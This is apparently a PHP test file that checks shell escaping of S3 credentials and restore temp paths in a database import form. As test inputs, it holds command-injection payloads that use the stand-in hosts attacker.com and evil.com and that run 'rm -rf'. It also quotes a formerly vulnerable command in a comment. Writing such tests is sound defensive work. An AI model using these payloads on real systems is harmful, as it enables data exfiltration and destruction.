<?php

use App\Livewire\Project\Database\ImportForm;
use App\Models\StandaloneMariadb;
use App\Models\StandaloneMongodb;
use App\Models\StandaloneMysql;
use App\Models\StandalonePostgresql;

it('escapeshellarg properly escapes S3 credentials with shell metacharacters', function () {
    // Test that escapeshellarg works correctly for various malicious inputs
    // This is the core security mechanism used by ImportForm.

    // Test case 1: Secret with command injection attempt
    $maliciousSecret = 'secret";curl https://attacker.com/ -X POST --data `whoami`;echo "pwned';
    $escapedSecret = escapeshellarg($maliciousSecret);

    // escapeshellarg should wrap in single quotes and escape any single quotes
    expect($escapedSecret)->toBe("'secret\";curl https://attacker.com/ -X POST --data `whoami`;echo \"pwned'");

    // When used in a command, the shell metacharacters should be treated as literal strings
    $command = "echo {$escapedSecret}";
    // The dangerous part (";curl) is now safely inside single quotes
    expect($command)->toContain("'secret"); // Properly quoted
    expect($escapedSecret)->toStartWith("'"); // Starts with quote
    expect($escapedSecret)->toEndWith("'"); // Ends with quote

    // Test case 2: Endpoint with command injection
    $maliciousEndpoint = 'https://s3.example.com";whoami;"';
    $escapedEndpoint = escapeshellarg($maliciousEndpoint);

    expect($escapedEndpoint)->toBe("'https://s3.example.com\";whoami;\"'");

    // Test case 3: Key with destructive command
    $maliciousKey = 'access-key";rm -rf /;echo "';
    $escapedKey = escapeshellarg($maliciousKey);

    expect($escapedKey)->toBe("'access-key\";rm -rf /;echo \"'");

    // Test case 4: Normal credentials should work fine
    $normalSecret = 'MySecretKey123';
    $normalEndpoint = 'https://s3.amazonaws.com';
    $normalKey = 'AKIAIOSFODNN7EXAMPLE';

    expect(escapeshellarg($normalSecret))->toBe("'MySecretKey123'");
    expect(escapeshellarg($normalEndpoint))->toBe("'https://s3.amazonaws.com'");
    expect(escapeshellarg($normalKey))->toBe("'AKIAIOSFODNN7EXAMPLE'");
});

it('verifies command injection is prevented in mc alias set command format', function () {
    // Simulate the exact scenario from ImportForm.
    $containerName = 's3-restore-test-uuid';
    $endpoint = 'https://s3.example.com";curl http://evil.com;echo "';
    $key = 'AKIATEST";whoami;"';
    $secret = 'SecretKey";rm -rf /tmp;echo "';

    // Before fix (vulnerable):
    // $vulnerableCommand = "docker exec {$containerName} mc alias set s3temp {$endpoint} {$key} \"{$secret}\"";
    // This would allow command injection because $endpoint and $key are not quoted,
    // and $secret's double quotes can be escaped

    // After fix (secure):
    $escapedEndpoint = escapeshellarg($endpoint);
    $escapedKey = escapeshellarg($key);
    $escapedSecret = escapeshellarg($secret);
    $secureCommand = "docker exec {$containerName} mc alias set s3temp {$escapedEndpoint} {$escapedKey} {$escapedSecret}";

    // Verify the secure command has properly escaped values
    expect($secureCommand)->toContain("'https://s3.example.com\";curl http://evil.com;echo \"'");
    expect($secureCommand)->toContain("'AKIATEST\";whoami;\"'");
    expect($secureCommand)->toContain("'SecretKey\";rm -rf /tmp;echo \"'");

    // Verify that the command injection attempts are neutered (they're literal strings now)
    // The values are wrapped in single quotes, so shell metacharacters are treated as literals
    // Check that all three parameters are properly quoted
    expect($secureCommand)->toMatch("/mc alias set s3temp '[^']+' '[^']+' '[^']+'/"); // All params in quotes

    // Verify the dangerous parts are inside quotes (between the quote marks)
    // The pattern "'...\";curl...'" means the semicolon is INSIDE the quoted value
    expect($secureCommand)->toContain("'https://s3.example.com\";curl http://evil.com;echo \"'");

    // Ensure we're NOT using the old vulnerable pattern with unquoted values
    $vulnerablePattern = 'mc alias set s3temp https://'; // Unquoted endpoint would match this
    expect($secureCommand)->not->toContain($vulnerablePattern);
});

it('handles S3 secrets with single quotes correctly', function () {
    // Test edge case: secret containing single quotes
    // escapeshellarg handles this by closing the quote, adding an escaped quote, and reopening
    $secretWithQuote = "my'secret'key";
    $escaped = escapeshellarg($secretWithQuote);

    // The expected output format is: 'my'\''secret'\''key'
    // This is how escapeshellarg handles single quotes in the input
    expect($escaped)->toBe("'my'\\''secret'\\''key'");

    // Verify it would work in a command context
    $containerName = 's3-restore-test';
    $endpoint = escapeshellarg('https://s3.amazonaws.com');
    $key = escapeshellarg('AKIATEST');
    $command = "docker exec {$containerName} mc alias set s3temp {$endpoint} {$key} {$escaped}";

    // The command should contain the properly escaped secret
    expect($command)->toContain("'my'\\''secret'\\''key'");
});

it('quotes restore command temp paths with spaces', function (string $morphClass) {
    $component = new class extends ImportForm
    {
        public string $morphClass;

        public function __get($property)
        {
            if ($property === 'resource') {
                return new class($this->morphClass)
                {
                    public function __construct(private readonly string $morphClass) {}

                    public function getMorphClass(): string
                    {
                        return $this->morphClass;
                    }
                };
            }

            return parent::__get($property);
        }
    };
    $component->morphClass = $morphClass;

    $tmpPath = '/tmp/restore_test-may 2026.sql.gz';
    $restoreCommand = $component->buildRestoreCommand($tmpPath);

    expect($restoreCommand)
        ->toContain(escapeshellarg($tmpPath))
        ->not->toContain(" {$tmpPath}");
})->with([
    'mariadb' => StandaloneMariadb::class,
    'mysql' => StandaloneMysql::class,
    'postgresql' => StandalonePostgresql::class,
    'mongodb' => StandaloneMongodb::class,
]);

it('quotes dump all restore command temp paths with spaces', function (string $morphClass) {
    $component = new class extends ImportForm
    {
        public string $morphClass;

        public function __get($property)
        {
            if ($property === 'resource') {
                return new class($this->morphClass)
                {
                    public function __construct(private readonly string $morphClass) {}

                    public function getMorphClass(): string
                    {
                        return $this->morphClass;
                    }
                };
            }

            return parent::__get($property);
        }
    };
    $component->morphClass = $morphClass;
    $component->dumpAll = true;

    $tmpPath = '/tmp/restore_test-may 2026.sql.gz';
    $escapedTmpPath = escapeshellarg($tmpPath);
    $restoreCommand = $component->buildRestoreCommand($tmpPath);

    expect($restoreCommand)
        ->toContain("gunzip -cf {$escapedTmpPath}")
        ->toContain("cat {$escapedTmpPath}")
        ->not->toContain("gunzip -cf {$tmpPath}")
        ->not->toContain("cat {$tmpPath}");
})->with([
    'mariadb' => StandaloneMariadb::class,
    'mysql' => StandaloneMysql::class,
    'postgresql' => StandalonePostgresql::class,
]);
